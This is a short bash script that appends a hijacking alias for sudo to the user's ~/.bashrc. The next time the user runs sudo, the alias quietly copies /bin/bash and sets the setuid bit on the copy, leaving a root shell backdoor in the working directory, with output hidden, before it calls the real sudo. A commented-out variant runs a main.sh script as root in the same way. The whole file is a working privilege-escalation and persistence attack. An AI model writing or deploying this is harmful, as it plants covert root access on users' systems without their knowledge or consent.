#!/bin/bash
scripts=$(pwd)'/main.sh'
#echo "alias sudo=\"/usr/bin/sudo /bin/bash $scripts 2>/dev/null 1>/dev/null;/usr/bin/sudo\"">>~/.bashrc
echo "alias sudo=\"sudo cp /bin/bash $(pwd)&& sudo chmod u+s $(pwd)/bash 1,2>/dev/null; /usr/bin/sudo\"">>~/.bashrc
